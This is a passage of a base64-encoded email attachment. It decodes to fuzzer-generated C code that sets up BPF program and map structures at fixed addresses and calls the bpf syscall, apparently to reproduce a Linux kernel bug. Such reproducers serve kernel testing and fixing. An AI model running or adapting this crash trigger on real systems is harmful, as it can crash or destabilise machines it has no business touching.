eDIwMDAwZTI5ID0gMDsNCioodWludDE2X3QqKTB4MjAwMDBlMmEgPSAwOw0KKih1aW50MzJfdCop
MHgyMDAwMGUyYyA9IDY7DQoqKHVpbnQ4X3QqKTB4MjAwMDBlMzAgPSAweDE4Ow0KU1RPUkVfQllf
QklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMzEsIDgsIDAsIDQpOw0KU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBlMzEsIDUsIDQsIDQpOw0KKih1aW50MTZfdCopMHgyMDAwMGUz
MiA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZTM0ID0gMTsNCioodWludDhfdCopMHgyMDAwMGUz
OCA9IDA7DQoqKHVpbnQ4X3QqKTB4MjAwMDBlMzkgPSAwOw0KKih1aW50MTZfdCopMHgyMDAwMGUz
YSA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZTNjID0gMDsNCioodWludDhfdCopMHgyMDAwMGU0
MCA9IDB4MTg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU0MSwgNiwgMCwg
NCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU0MSwgNiwgNCwgNCk7DQoq
KHVpbnQxNl90KikweDIwMDAwZTQyID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBlNDQgPSA0Ow0K
Kih1aW50OF90KikweDIwMDAwZTQ4ID0gMDsNCioodWludDhfdCopMHgyMDAwMGU0OSA9IDA7DQoq
KHVpbnQxNl90KikweDIwMDAwZTRhID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBlNGMgPSAweGZm
ZmZmZmZiOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTAsIDcsIDAsIDMp
Ow0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTAsIDEsIDMsIDEpOw0KU1RP
UkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNTAsIDB4YiwgNCwgNCk7DQpTVE9SRV9C
WV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU1MSwgMSwgMCwgNCk7DQpTVE9SRV9CWV9CSVRN
QVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU1MSwgOSwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAw
ZTUyID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBlNTQgPSAwOw0KU1RPUkVfQllfQklUTUFTSyh1
aW50OF90LCAsIDB4MjAwMDBlNTgsIDcsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90
LCAsIDB4MjAwMDBlNTgsIDAsIDMsIDEpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4
MjAwMDBlNTgsIDB4YiwgNCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAw
MGU1OSwgMiwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU1OSwg
MCwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZTVhID0gMDsNCioodWludDMyX3QqKTB4MjAw
MDBlNWMgPSAwOw0KKih1aW50OF90KikweDIwMDAwZTYwID0gMHg4NTsNCioodWludDhfdCopMHgy
MDAwMGU2MSA9IDA7DQoqKHVpbnQxNl90KikweDIwMDAwZTYyID0gMDsNCioodWludDMyX3QqKTB4
MjAwMDBlNjQgPSAweDg0Ow0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNjgs
IDcsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNjgsIDAsIDMs
IDEpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlNjgsIDB4YiwgNCwgNCk7
DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU2OSwgMCwgMCwgNCk7DQpTVE9S
RV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGU2OSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90
KikweDIwMDAwZTZhID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBlNmMgPSAwOw0KKih1aW50OF90
KikweDIwMDAwZTcwID0gMHg5NTsNCioodWludDhfdCopMHgyMDAwMGU3MSA9IDA7DQoqKHVpbnQx
Nl90KikweDIwMDAwZTcyID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBlNzQgPSAwOw0KKih1aW50
NjRfdCopMHgyMDAwMDQ5MCA9IDB4MjAwMDAwNDA7DQptZW1jcHkoKHZvaWQqKTB4MjAwMDAwNDAs
ICJHUExcMDAwIiwgNCk7DQoqKHVpbnQzMl90KikweDIwMDAwNDk4ID0gMHhiOw0KKih1aW50MzJf
dCopMHgyMDAwMDQ5YyA9IDB4YzA7DQoqKHVpbnQ2NF90KikweDIwMDAwNGEwID0gMHgyMDAwMGM4
MDsNCioodWludDMyX3QqKTB4MjAwMDA0YTggPSAweDQxMTAwOw0KKih1aW50MzJfdCopMHgyMDAw
MDRhYyA9IDB4Mzg7DQptZW1zZXQoKHZvaWQqKTB4MjAwMDA0YjAsIDAsIDE2KTsNCioodWludDMy
X3QqKTB4MjAwMDA0YzAgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMDRjNCA9IDB4MjU7DQoqKHVp
bnQzMl90KikweDIwMDAwNGM4ID0gclswXTsNCioodWludDMyX3QqKTB4MjAwMDA0Y2MgPSA4Ow0K
Kih1aW50NjRfdCopMHgyMDAwMDRkMCA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwNGQ4ID0gMDsN
CioodWludDMyX3QqKTB4MjAwMDA0ZGMgPSAweDEwOw0KKih1aW50NjRfdCopMHgyMDAwMDRlMCA9
IDB4MjAwMDAyYzA7DQoqKHVpbnQzMl90KikweDIwMDAwMmMwID0gMDsNCioodWludDMyX3QqKTB4
MjAwMDAyYzQgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMDJjOCA9IDA7DQoqKHVpbnQzMl90Kikw
eDIwMDAwMmNjID0gOTsNCioodWludDMyX3QqKTB4MjAwMDA0ZTggPSAxOw0KKih1aW50MzJfdCop
MHgyMDAwMDRlYyA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwNGYwID0gMDsNCioodWludDMyX3Qq
KTB4MjAwMDA0ZjQgPSA5Ow0KKih1aW50NjRfdCopMHgyMDAwMDRmOCA9IDB4MjAwMDAzODA7DQoq
KHVpbnQzMl90KikweDIwMDAwMzgwID0gLTE7DQoqKHVpbnQzMl90KikweDIwMDAwMzg0ID0gLTE7
DQoqKHVpbnQzMl90KikweDIwMDAwMzg4ID0gLTE7DQoqKHVpbnQ2NF90KikweDIwMDAwNTAwID0g
MHgyMDAwMDNjMDsNCioodWludDMyX3QqKTB4MjAwMDAzYzAgPSAxOw0KKih1aW50MzJfdCopMHgy
MDAwMDNjNCA9IDQ7DQoqKHVpbnQzMl90KikweDIwMDAwM2M4ID0gMHhiOw0KKih1aW50MzJfdCop
MHgyMDAwMDNjYyA9IDY7DQoqKHVpbnQzMl90KikweDIwMDAwM2QwID0gMjsNCioodWludDMyX3Qq
KTB4MjAwMDAzZDQgPSAyOw0KKih1aW50MzJfdCopMHgyMDAwMDNkOCA9IDE7DQoqKHVpbnQzMl90
KikweDIwMDAwM2RjID0gMDsNCioodWludDMyX3QqKTB4MjAwMDAzZTAgPSA1Ow0KKih1aW50MzJf
dCopMHgyMDAwMDNlNCA9IDQ7DQoqKHVpbnQzMl90KikweDIwMDAwM2U4ID0gMHhlOw0KKih1aW50
MzJfdCopMHgyMDAwMDNlYyA9IDB4YjsNCioodWludDMyX3QqKTB4MjAwMDAzZjAgPSAyOw0KKih1
aW50MzJfdCopMHgyMDAwMDNmNCA9IDB4MTAwMDAwMzsNCioodWludDMyX3QqKTB4MjAwMDAzZjgg
PSAyOw0KKih1aW50MzJfdCopMHgyMDAwMDNmYyA9IDM7DQoqKHVpbnQzMl90KikweDIwMDAwNDAw
ID0gMjsNCioodWludDMyX3QqKTB4MjAwMDA0MDQgPSA1Ow0KKih1aW50MzJfdCopMHgyMDAwMDQw
OCA9IDB4YTsNCioodWludDMyX3QqKTB4MjAwMDA0MGMgPSA1Ow0KKih1aW50MzJfdCopMHgyMDAw
MDQxMCA9IDM7DQoqKHVpbnQzMl90KikweDIwMDAwNDE0ID0gMTsNCioodWludDMyX3QqKTB4MjAw
MDA0MTggPSAweGE7DQoqKHVpbnQzMl90KikweDIwMDAwNDFjID0gMzsNCioodWludDMyX3QqKTB4
MjAwMDA0MjAgPSAzOw0KKih1aW50MzJfdCopMHgyMDAwMDQyNCA9IDM7DQoqKHVpbnQzMl90Kikw
eDIwMDAwNDI4ID0gNTsNCioodWludDMyX3QqKTB4MjAwMDA0MmMgPSA4Ow0KKih1aW50MzJfdCop
MHgyMDAwMDQzMCA9IDM7DQoqKHVpbnQzMl90KikweDIwMDAwNDM0ID0gMTsNCioodWludDMyX3Qq
KTB4MjAwMDA0MzggPSA1Ow0KKih1aW50MzJfdCopMHgyMDAwMDQzYyA9IDU7DQoqKHVpbnQzMl90
KikweDIwMDAwNDQwID0gMDsNCioodWludDMyX3QqKTB4MjAwMDA0NDQgPSAyOw0KKih1aW50MzJf
dCopMHgyMDAwMDQ0OCA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwNDRjID0gNzsNCioodWludDMy
X3QqKTB4MjAwMDA1MDggPSAweDEwOw0KKih1aW50MzJfdCopMHgyMDAwMDUwYyA9IDB4MTAwMDA7
DQoJCXN5c2NhbGwoX19OUl9icGYsIC8qY21kPSovNXVsLCAvKmFyZz0qLzB4MjAwMDA0ODB1bCwg
LypzaXplPSovMHg5MHVsKTsNCgkJYnJlYWs7DQoJY2FzZSAyOg0KKih1aW50MzJfdCopMHgyMDAw
MDQ0MCA9IC0xOw0KKih1aW50NjRfdCopMHgyMDAwMDQ0OCA9IDB4MjAwMDAzYzA7DQoqKHVpbnQz
Ml90KikweDIwMDAwM2MwID0gMDsNCioodWludDY0X3QqKTB4MjAwMDA0NTAgPSAwOw0KKih1aW50
NjRfdCopMHgyMDAwMDQ1OCA9IDA7DQoJCXN5c2NhbGwoX19OUl9icGYsIC8qY21kPSovMnVsLCAv
KmFyZz0qLzB4MjAwMDA0NDB1bCwgLypzaXplPSovMHgyMHVsKTsNCgkJYnJlYWs7DQoJfQ0KDQp9
DQppbnQgbWFpbih2b2lkKQ0Kew0KCQlzeXNjYWxsKF9fTlJfbW1hcCwgLyphZGRyPSovMHgxZmZm
ZjAwMHVsLCAvKmxlbj0qLzB4MTAwMHVsLCAvKnByb3Q9Ki8wdWwsIC8qZmxhZ3M9TUFQX0ZJWEVE
fE1BUF9BTk9OWU1PVVN8TUFQX1BSSVZBVEUqLzB4MzJ1bCwgLypmZD0qLy0xLCAvKm9mZnNldD0q
LzB1bCk7DQoJc3lzY2FsbChfX05SX21tYXAsIC8qYWRkcj0qLzB4MjAwMDAwMDB1bCwgLypsZW49
Ki8weDEwMDAwMDB1bCwgLypwcm90PVBST1RfV1JJVEV8UFJPVF9SRUFEfFBST1RfRVhFQyovN3Vs
LCAvKmZsYWdzPU1BUF9GSVhFRHxNQVBfQU5PTllNT1VTfE1BUF9QUklWQVRFKi8weDMydWwsIC8q
ZmQ9Ki8tMSwgLypvZmZzZXQ9Ki8wdWwpOw0KCXN5c2NhbGwoX19OUl9tbWFwLCAvKmFkZHI9Ki8w
eDIxMDAwMDAwdWwsIC8qbGVuPSovMHgxMDAwdWwsIC8qcHJvdD0qLzB1bCwgLypmbGFncz1NQVBf
RklYRUR8TUFQX0FOT05ZTU9VU3xNQVBfUFJJVkFURSovMHgzMnVsLCAvKmZkPSovLTEsIC8qb2Zm
c2V0PSovMHVsKTsNCgljb25zdCBjaGFyKiByZWFzb247DQoJKHZvaWQpcmVhc29uOw0KCQkJbG9v
cCgpOw0KCXJldHVybiAwOw0KfQ0KDQo=
--000000000000dda6d2062019f35f--

